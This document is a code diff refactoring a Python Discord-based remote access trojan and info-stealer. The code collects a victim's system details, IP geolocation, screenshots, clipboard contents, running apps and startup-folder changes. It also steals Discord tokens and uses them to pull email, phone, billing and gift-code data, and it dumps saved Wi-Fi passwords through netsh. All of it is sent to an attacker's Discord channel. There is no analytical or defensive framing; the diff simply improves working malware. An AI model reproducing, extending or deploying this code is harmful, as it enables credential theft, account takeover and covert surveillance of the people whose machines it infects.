@@ -47,7 +47,6 @@ async def updates(bot, channel_id):
         except:
             return True
 
-
     def is_taskmgr_enabled():
         try:
             reg_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
@@ -56,7 +55,6 @@ async def updates(bot, channel_id):
                 return value == 0
         except FileNotFoundError:
             return True
-
     def check_startup_files():
         start_dir = os.path.join(os.getenv("APPDATA"), "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
         current_files = set()
@@ -64,9 +62,7 @@ async def updates(bot, channel_id):
             for file in files:
                 current_files.add(os.path.join(root, file))
         return current_files
-
     startup = check_startup_files()
-
     while True:
         try:
             clip = pyperclip.paste()
@@ -82,9 +78,7 @@ async def updates(bot, channel_id):
                         f.write(clip)
                     embed = discord.Embed(title="CLIPBOARD UPDATED:", description="Content too large, sent as file.", color=0xFFFF00)
                     await channel.send(embed=embed, file=discord.File(path, "clip.txt"))
-
             procs = {p.name(): p for p in psutil.process_iter(['name', 'exe', 'username']) if not is_sys(p)}
-
             for name in procs:
                 if name not in tracked:
                     embed = discord.Embed(title="APP OPENED:", description=name, color=0x00FF00)
@@ -95,14 +89,12 @@ async def updates(bot, channel_id):
                     await channel.send(embed=embed)
                     tracked.remove(name)
             tracked = set(procs)
-
             current_taskmgr_state = is_taskmgr_enabled()
             if current_taskmgr_state != taskmgr_enabled:
                 state = "ENABLED" if current_taskmgr_state else "DISABLED"
                 embed = discord.Embed(title="TASK MANAGER TOGGLED:", description=f"NOW: {state}", color=0xFFA500)
                 await channel.send(embed=embed)
                 taskmgr_enabled = current_taskmgr_state
-
             current_startup = check_startup_files()
             for path in current_startup - startup:
                 embed = discord.Embed(title="FILE ADDED TO STARTUP:", description=path, color=0x800080)
@@ -111,7 +103,6 @@ async def updates(bot, channel_id):
                 embed = discord.Embed(title="FILE REMOVED FROM STARTUP:", description=path, color=0x0000FF)
                 await channel.send(embed=embed)
             startup = current_startup
-
             await asyncio.sleep(0.1)
         except:
             continue
@@ -236,9 +227,6 @@ async def start_moonman(bot, channel_id):
 
     keyboard_listener.start()
     mouse_listener.start()
-
-    while True:
-        await asyncio.sleep(1)
         
 
 async def run(bot):
@@ -249,76 +237,55 @@ async def run(bot):
     ip_geolocation = None
     location = "N/A"
     token = None
-    mac_address = os_version = timezone = None
+    mac_address = version = timezone = None
     screenshot_path = screenshot_file = None
-    wifi_details = ""
-    cursor_x, cursor_y = None, None
+    wifiinfo = ""
     ram = ram_used = memory = memory_used = 0
     uptime = None
 
-    def fetch_pc_info():
-        nonlocal pcname, username
+    async def sysinfoa():
+        nonlocal pcname, username, version, timezone, uptime
         try: pcname = subprocess.check_output("echo %COMPUTERNAME%", shell=True).decode().strip()
         except: pass
         try: username = subprocess.check_output("echo %USERNAME%", shell=True).decode().strip()
         except: pass
+        try: version = platform.system() + " " + platform.release()
+        except: pass
+        try: timezone = datetime.now().astimezone().tzinfo.tzname(None)
+        except: pass
+        try: uptime_seconds = int(psutil.boot_time())
+        except: uptime_seconds = None
+        if uptime_seconds:
+            uptime = str(timedelta(seconds=(datetime.now().timestamp() - uptime_seconds)))
 
-    def fetch_admin_status():
+    async def isadmin():
         nonlocal is_admin
         try: is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
         except: pass
 
-    def fetch_ip_info():
-        nonlocal ipv4, public_ip, ip_geolocation, location
+    async def getip():
+        nonlocal ipv4, public_ip, ip_geolocation, location, mac_address
         ipv4, public_ip, ip_geolocation, location = None, None, None, "N/A"
         try:
-            ipv4 = [
-                i[4][0]
-                for i in socket.getaddrinfo(socket.gethostname(), None, socket.AF_INET)
-                if i[4][0].startswith(("10", "172", "192"))
-            ][0]
-        except Exception:
-            ipv4 = None
-
-        try:
-            public_ip = requests.get('https://api64.ipify.org', timeout=5).text
-        except Exception:
-            public_ip = None
-
+            ipv4 = [i[4][0] for i in socket.getaddrinfo(socket.gethostname(), None, socket.AF_INET) if i[4][0].startswith(("10", "172", "192"))][0]
+        except Exception: ipv4 = None
+        try: public_ip = requests.get('https://api64.ipify.org', timeout=5).text
+        except Exception: public_ip = None
         if public_ip:
-            try:
-                ip_geolocation = requests.get(
-                    f"http://ip-api.com/json/{public_ip}", timeout=5
-                ).json()
-            except Exception:
-                ip_geolocation = None
-
+            try: ip_geolocation = requests.get(f"http://ip-api.com/json/{public_ip}", timeout=5).json()
+            except Exception: ip_geolocation = None
         if ip_geolocation:
             location = f"{ip_geolocation.get('city', 'N/A')}, {ip_geolocation.get('country', 'N/A')}"
-        else:
-            location = "N/A"
+        else: location = "N/A"
+        try: mac_address = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0, 2*6, 2)][::-1])
+        except: mac_address = None
 
-    def fetch_token():
+    async def tokenthief():
         nonlocal token
         try: token = GETTOKEN().gettokens()
         except: pass
 
-    def fetch_mac_address():
-        nonlocal mac_address
-        try: mac_address = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0, 2*6, 2)][::-1])
-        except: pass
-
-    def fetch_os_version():
-        nonlocal os_version
-        try: os_version = platform.system() + " " + platform.release()
-        except: pass
-
-    def fetch_timezone():
-        nonlocal timezone
-        try: timezone = datetime.now().astimezone().tzinfo.tzname(None)
-        except: pass
-
-    def fetch_screenshot():
+    async def getss():
         nonlocal screenshot_path, screenshot_file
         screenshot_dir = os.path.join(os.getenv("APPDATA"), "screenshots")
         os.makedirs(screenshot_dir, exist_ok=True)
@@ -330,59 +297,63 @@ async def run(bot):
                 with open(screenshot_path, "rb") as img: screenshot_file = discord.File(img, "screenshot.png")
             except: pass 
 
-    def fetch_wifi_info():
-        nonlocal wifi_details
-        try: wifi_info = subprocess.check_output("netsh wlan show profiles", shell=True, creationflags=subprocess.CREATE_NO_WINDOW).decode().split("\n")
-        except: wifi_info = []
-        ssid_list = [line.split(":")[1].strip() for line in wifi_info if "All User Profile" in line]
-        current_wifi = None
-        try:
-            current_wifi = subprocess.check_output('netsh wlan show interfaces', shell=True, creationflags=subprocess.CREATE_NO_WINDOW).decode().split("\n")
-            current_wifi = [line.split(":")[1].strip() for line in current_wifi if "SSID" in line][0]
-        except: current_wifi = None
-        for ssid in ssid_list:
-            try: profile_info = subprocess.check_output(f"netsh wlan show profile {ssid} key=clear", shell=True, creationflags=subprocess.CREATE_NO_WINDOW).decode().split("\n")
-            except: profile_info = []
-            password = "Not found"
-            for line in profile_info:
-                if "Key Content" in line: password = line.split(":")[1].strip(); break
-            if ssid == current_wifi: wifi_details += f"```**CURRENT SSID: {ssid}**``` | Password: ```**{password}**```\n"
-            else: wifi_details += f"SSID: ```{ssid}``` | Password: ```{password}```\n"
+    async def stealwifi():
+        nonlocal wifiinfo
+        def get_wifi_profiles():
+            try:
+                wifi_info = subprocess.check_output("netsh wlan show profiles", shell=True, creationflags=subprocess.CREATE_NO_WINDOW).decode().split("\n")
+                return [line.split(":")[1].strip() for line in wifi_info if "All User Profile" in line]
+            except:
+                return []
 
-    def fetch_cursor_coords():
-        nonlocal cursor_x, cursor_y
-        try: cursor_x, cursor_y = pyautogui.position()
-        except: pass
+        def get_current_wifi():
+            try:
+                current_wifi = subprocess.check_output('netsh wlan show interfaces', shell=True, creationflags=subprocess.CREATE_NO_WINDOW).decode().split("\n")
+                return [line.split(":")[1].strip() for line in current_wifi if "SSID" in line][0]
+            except:
+                return None
 
-    def fetch_memory_info():
+        def get_wifi_password(ssid):
+            try:
+                profile_info = subprocess.check_output(f"netsh wlan show profile {ssid} key=clear", shell=True, creationflags=subprocess.CREATE_NO_WINDOW).decode().split("\n")
+                for line in profile_info:
+                    if "Key Content" in line:
+                        return line.split(":")[1].strip()
+                return "N/A"
+            except:
+                return "N/A"
+
+        loop = asyncio.get_event_loop()
+        ssid_list = await loop.run_in_executor(None, get_wifi_profiles)
+        current_wifi = await loop.run_in_executor(None, get_current_wifi)
+
+        async def process_ssid(ssid):
+            password = await loop.run_in_executor(None, get_wifi_password, ssid)
+            if ssid == current_wifi:
+                return f"**CURRENT SSID: {ssid}** | Password: **{password}**\n"
+            else:
+                return f"{ssid} | {password}\n"
+
+        results = await asyncio.gather(*[process_ssid(ssid) for ssid in ssid_list])
+        wifiinfo = "".join(results)
+
+    async def getmem():
         nonlocal ram, ram_used, memory, memory_used
-        try: ram = psutil.virtual_memory().total / (1024 ** 3)
-        except: pass
-        try: ram_used = psutil.virtual_memory().used / (1024 ** 3)
-        except: pass
-        try: c_drive = psutil.disk_usage('C:/')
-        except: c_drive = None
-        if c_drive:
-            try: memory = c_drive.total / (1024 ** 3)
-            except: pass
-            try: memory_used = c_drive.used / (1024 ** 3)
-            except: pass
+        try:
+            mem_info = psutil.virtual_memory()
+            ram = mem_info.total / (1024 ** 3)
+            ram_used = mem_info.used / (1024 ** 3)
+        except:
+            pass
+        try:
+            c_drive = psutil.disk_usage('C:/')
+            memory = c_drive.total / (1024 ** 3)
+            memory_used = c_drive.used / (1024 ** 3)
+        except:
+            pass
 
-    def fetch_uptime():
-        nonlocal uptime
-        try: uptime_seconds = int(psutil.boot_time())
-        except: uptime_seconds = None
-        if uptime_seconds:
-            uptime = str(timedelta(seconds=(datetime.now().timestamp() - uptime_seconds)))
-
-    threads = []
-    for func in [fetch_pc_info, fetch_admin_status, fetch_ip_info, fetch_token, fetch_mac_address, fetch_os_version, fetch_timezone, fetch_screenshot, fetch_wifi_info, fetch_cursor_coords, fetch_memory_info, fetch_uptime]:
-        thread = threading.Thread(target=func)
-        thread.start()
-        threads.append(thread)
-    
-    for thread in threads:
-        thread.join()
+    tasks = [sysinfoa(), isadmin(), getip(), tokenthief(), getss(), stealwifi(), getmem()]
+    await asyncio.gather(*tasks)
 
     category_name = f'{username}-{pcname}'
     category = await guild.create_category(category_name)
@@ -422,129 +393,80 @@ async def run(bot):
     if os.path.exists(zip_file_path):
         os.remove(zip_file_path)
 
-    embed = discord.Embed(title=pcname, color=discord.Color.red())
-
+    embed = discord.Embed(title=f"System Information: {pcname}", color=discord.Color.dark_embed())
+    procid = subprocess.check_output(["powershell", "-Command", "(Get-WmiObject Win32_ComputerSystemProduct).UUID"], text=True)
+    hwwid = procid.strip()
     if screenshot_path and os.path.exists(screenshot_path):
         embed.set_image(url="attachment://screenshot.png")
-
-    admin_status = "✅" if is_admin else "❌"
-    embed.add_field(name="🔒 Admin", value=admin_status, inline=True)
-    embed.add_field(name="📍 IP Geolocation", value=location, inline=True)
-    embed.add_field(name="🌐 Private IPv4", value=ipv4 if ipv4 else "N/A", inline=True)
-    embed.add_field(name="🌍 Public IP", value=public_ip if public_ip else "N/A", inline=True)
-    embed.add_field(name="👤 Username", value=username if username else "N/A", inline=True)
-    embed.add_field(name="💻 PC Name", value=pcname if pcname else "N/A", inline=True)
-    embed.add_field(name="🔌 MAC Address", value=mac_address if mac_address else "N/A", inline=True)
-    embed.add_field(name="🖥 OS", value=os_version if os_version else "N/A", inline=True)
-    embed.add_field(name="🕒 Time Zone", value=timezone if timezone else "N/A", inline=True)
-    embed.add_field(name="🖱 Cursor Position", value=f"X: {cursor_x} Y: {cursor_y}", inline=True)
-    embed.add_field(name="🔧 Current Exe Name", value=sys.executable, inline=False)
-    embed.add_field(name="📶 Wi-Fi Info", value=wifi_details if wifi_details else "ETHERNET", inline=False)
-    embed.add_field(name="💾 RAM", value=f"Used: {ram_used:.2f} GB / Total: {ram:.2f} GB", inline=True)
-    embed.add_field(name="💾 Memory", value=f"Used: {memory_used:.2f} GB / Total: {memory:.2f} GB", inline=True)
-    embed.add_field(name="⏳ Uptime", value=uptime if uptime else "N/A", inline=True)
-
-    if screenshot_file:
-        await commands_channel.send(embed=embed, file=screenshot_file)
-    else:
-        await commands_channel.send(embed=embed)
-
+        admin_status = "⛔" if is_admin else "🟢"
+        embed.add_field(name="🔒 Running as Admin:", value=f"{admin_status}", inline=False)
+        embed.add_field(name="👤 User:", value=f"```Display Name: {username if username else 'N/A'}\nUsername: {username if username else 'N/A'}\nPCName: {pcname if pcname else 'N/A'}```", inline=False)
+        embed.add_field(name="System:", value=f"```CPU: {platform.processor()}\nGPU: {platform.machine()}\nRAM: {ram:.2f} GB\nHWID: {hwwid}```", inline=False)
+        disk_info = "Drive       Free         Total         Use%\n"
+        for part in psutil.disk_partitions():
+            if part.fstype:
+                usage = psutil.disk_usage(part.mountpoint)
+                disk_info += f"{part.device:<12}{usage.free / (1024 ** 3):>10.2f}GB{usage.total / (1024 ** 3):>10.2f}GB{usage.percent:>6}%\n"
+        embed.add_field(name="Drives:", value=f"```{disk_info}```", inline=False)
+        network_info = f"IP ADDRESS: {public_ip if public_ip else 'N/A'}\nMAC ADDRESS: {mac_address if mac_address else 'N/A'}\nCountry: {ip_geolocation.get('country', 'N/A') if ip_geolocation else 'N/A'}\nRegion: {ip_geolocation.get('regionName', 'N/A') if ip_geolocation else 'N/A'}\nCity: {ip_geolocation.get('city', 'N/A') if ip_geolocation else 'N/A'}\nISP: {ip_geolocation.get('isp', 'N/A') if ip_geolocation else 'N/A'}\n"
+        embed.add_field(name="Network", value=f"```{network_info}```", inline=False)
+        if wifiinfo:
+            wifi_lines = wifiinfo.split("\n")
+            max_ssid_length = max(len(line.split('|')[0].strip()) for line in wifi_lines if '|' in line)
+            max_password_length = max(len(line.split('|')[1].strip()) for line in wifi_lines if '|' in line)
+            formatted_wifi_info = "SSID".ljust(max_ssid_length) + " | PASSWORD\n" + "-" * max_ssid_length + " | " + "-" * max_password_length + "\n" + "\n".join([f"{line.split('|')[0].strip().ljust(max_ssid_length)} | {line.split('|')[1].strip().ljust(max_password_length)}" for line in wifi_lines if '|' in line])
+        else:
+            formatted_wifi_info = "No Wifi Profiles Found"
+        embed.add_field(name="📶 WIFI", value=f"```{formatted_wifi_info}```", inline=False)
+        embed.set_footer(text="System Information Report", icon_url="https://repository-images.githubusercontent.com/928484583/1a270996-409f-45f3-8451-a5c965c35ca2")
+        embed.set_author(name=f"{pcname} Log", icon_url="https://repository-images.githubusercontent.com/928484583/1a270996-409f-45f3-8451-a5c965c35ca2")
+        embed.timestamp = datetime.now()
+        if screenshot_file: 
+            await commands_channel.send(embed=embed, file=screenshot_file)
+        else:
+            await commands_channel.send(embed=embed)
     for t in token:
         second_embed = discord.Embed(color=discord.Color.purple())
-
         second_embed.add_field(name="🔑 Discord Token", value=f"```{t if t else 'none'}```", inline=False)
 
         if t:
-            headers = {
-                "Authorization": f"{t}"
-            }
+            headers = {"Authorization": f"{t}"}
+            user_data = requests.get("https://discord.com/api/v9/users/@me", headers=headers).json()
+            billing_data = requests.get('https://discord.com/api/v9/users/@me/billing/payment-sources', headers=headers).json()
+            gift_codes = requests.get('https://discord.com/api/v9/users/@me/outbound-promotions/codes', headers=headers).json()
 
-            user_data = None
-            billing_data = None
-            gift_codes = None
+            discord_username = user_data.get('username', 'Unknown')
+            display_name = user_data.get('nick', 'No Display Name')
+            premium_type = user_data.get('premium_type', 0)
+            phone_number = user_data.get('phone', 'N/A')
+            email = user_data.get('email', 'N/A')
+            email_verified = user_data.get('verified', False)
+            pfp_url = user_data.get('avatar', None)
 
-            def fetch_user_data():
-                nonlocal user_data
-                user_data = requests.get("https://discord.com/api/v9/users/@me", headers=headers).json()
+            billing_method = "None"
+            for payment_source in billing_data:
+                if payment_source.get('type') == 1:
+                    billing_method = "Credit Card"
+                elif payment_source.get('type') == 2:
+                    billing_method = "Paypal"
+            billing_status = f"Active ({billing_method})" if billing_data else "No active billing method"
 
-            def fetch_billing_data():
-                nonlocal billing_data
-                billing_data = requests.get('https://discord.com/api/v9/users/@me/billing/payment-sources', headers=headers).json()
+            second_embed.title = discord_username
+            second_embed.add_field(name="Display Name", value=display_name, inline=False)
+            second_embed.add_field(name="Billing 💰", value=billing_status, inline=False)
 
-            def fetch_gift_codes():
-                nonlocal gift_codes
-                gift_codes = requests.get('https://discord.com/api/v9/users/@me/outbound-promotions/codes', headers=headers).json()
+            nitro_status = "None" if premium_type == 0 else "Nitro Classic" if premium_type == 1 else "Nitro Boost"
+            second_embed.add_field(name="Nitro", value=f"💎 {nitro_status}", inline=False)
+            second_embed.add_field(name="Email", value=email, inline=False)
+            second_embed.add_field(name="Phone Number 📱", value=phone_number, inline=False)
+            second_embed.add_field(name="Email Verified", value="✅" if email_verified else "❌", inline=False)
 
-            user_thread = threading.Thread(target=fetch_user_data)
-            billing_thread = threading.Thread(target=fetch_billing_data)
-            gift_codes_thread = threading.Thread(target=fetch_gift_codes)
+            gift_code_list = "\n".join([f"Code: {code['code']} - {code['status']}" for code in gift_codes])
+            second_embed.add_field(name="Gift Codes", value=gift_code_list if gift_codes else "No Gift Codes", inline=False)
 
-            user_thread.start()
-            billing_thread.start()
-            gift_codes_thread.start()
-
-            user_thread.join()
-            billing_thread.join()
-            gift_codes_thread.join()
-
-            try:
-                if user_data:
-                    discord_username = user_data.get('username', 'Unknown')
-                    display_name = user_data.get('nick', 'No Display Name')
-                    premium_type = user_data.get('premium_type', 0)
-                    phone_number = user_data.get('phone', 'N/A')
-                    email = user_data.get('email', 'N/A')
-                    email_verified = user_data.get('verified', False)
-                    pfp_url = user_data.get('avatar', None)
-
-                    if billing_data:
-                        if billing_data:
-                            billing_method = "None"
-                            for payment_source in billing_data:
-                                if payment_source.get('type') == 1:
-                                    billing_method = "Credit Card"
-                                elif payment_source.get('type') == 2:
-                                    billing_method = "Paypal"
-                            billing_status = f"Active ({billing_method})"
-                        else:
-                            billing_status = "No active billing method"
-                    else:
-                        billing_status = "Error fetching billing info"
-
-                    second_embed.title = discord_username
-                    second_embed.add_field(name="Display Name", value=display_name, inline=False)
-                    second_embed.add_field(name="Billing 💰", value=billing_status, inline=False)
-
-                    if premium_type == 0:
-                        nitro_status = "None"
-                    elif premium_type == 1:
-                        nitro_status = "Nitro Classic"
-                    elif premium_type == 2:
-                        nitro_status = "Nitro Boost"
-                    second_embed.add_field(name="Nitro", value=f"💎 {nitro_status}", inline=False)
-
-                    second_embed.add_field(name="Email", value=email, inline=False)
-                    second_embed.add_field(name="Phone Number 📱", value=phone_number, inline=False)
-                    second_embed.add_field(name="Email Verified", value="✅" if email_verified else "❌", inline=False)
-
-                    if gift_codes:
-                        gift_code_list = "\n".join([f"Code: {code['code']} - {code['status']}" for code in gift_codes])
-                        second_embed.add_field(name="Gift Codes", value=gift_code_list if gift_codes else "No Gift Codes", inline=False)
-
-                    if pfp_url:
-                        second_embed.set_thumbnail(url=f"https://cdn.discordapp.com/avatars/{user_data['id']}/{pfp_url}.png")
-
-            except Exception as e:
-                second_embed.title = "Error Fetching Data"
-                second_embed.add_field(name="Error", value=str(e), inline=False)
+            if pfp_url:
+                second_embed.set_thumbnail(url=f"https://cdn.discordapp.com/avatars/{user_data['id']}/{pfp_url}.png")
 
         await commands_channel.send(embed=second_embed)
 
-
-
-
     return commands_channel
-
-
-
-    
